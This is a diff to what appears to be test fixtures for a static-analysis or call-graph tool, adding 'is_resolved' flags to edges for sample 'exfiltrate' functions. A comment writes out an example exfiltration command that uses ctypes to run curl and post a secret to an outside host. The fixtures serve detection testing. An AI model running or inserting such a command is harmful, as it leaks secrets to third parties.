@@ -96,9 +96,9 @@ TELNET_EDGES = [
     {"src": "python:main.py:5-8:exfiltrate:function",
      "dst": "python:telnetlib:0-0:Telnet:external_symbol", "type": "instantiates"},
     {"src": "python:main.py:5-8:exfiltrate:function",
-     "dst": "python:external:0-0:write:external_symbol", "type": "calls"},
+     "dst": "python:external:0-0:write:external_symbol", "is_resolved": False, "type": "calls"},
     {"src": "python:main.py:5-8:exfiltrate:function",
-     "dst": "python:external:0-0:close:external_symbol", "type": "calls"},
+     "dst": "python:external:0-0:close:external_symbol", "is_resolved": False, "type": "calls"},
     {"src": "python:main.py:11-12:main:function",
      "dst": "python:os:0-0:os.environ:external_symbol", "type": "module_attr_ref"},
 ]
@@ -113,7 +113,7 @@ SSL_EDGES = [
     {"src": "python:main.py:5-8:exfiltrate:function",
      "dst": "python:ssl:0-0:SSLSocket:external_symbol", "type": "instantiates"},
     {"src": "python:main.py:5-8:exfiltrate:function",
-     "dst": "python:external:0-0:sendall:external_symbol", "type": "calls"},
+     "dst": "python:external:0-0:sendall:external_symbol", "is_resolved": False, "type": "calls"},
 ]
 
 #: ``ctypes.CDLL("libc.so.6").system(b"curl -d <secret> http://...")``.
@@ -123,7 +123,7 @@ CTYPES_EDGES = [
     {"src": "python:main.py:5-7:exfiltrate:function",
      "dst": "python:ctypes:0-0:CDLL:external_symbol", "type": "instantiates"},
     {"src": "python:main.py:5-7:exfiltrate:function",
-     "dst": "python:external:0-0:system:external_symbol", "type": "calls"},
+     "dst": "python:external:0-0:system:external_symbol", "is_resolved": False, "type": "calls"},
 ]
 
 #: THE ORIGINAL FIXTURES HERE GRADUATED. ``os.sendfile`` and ``os.open`` +
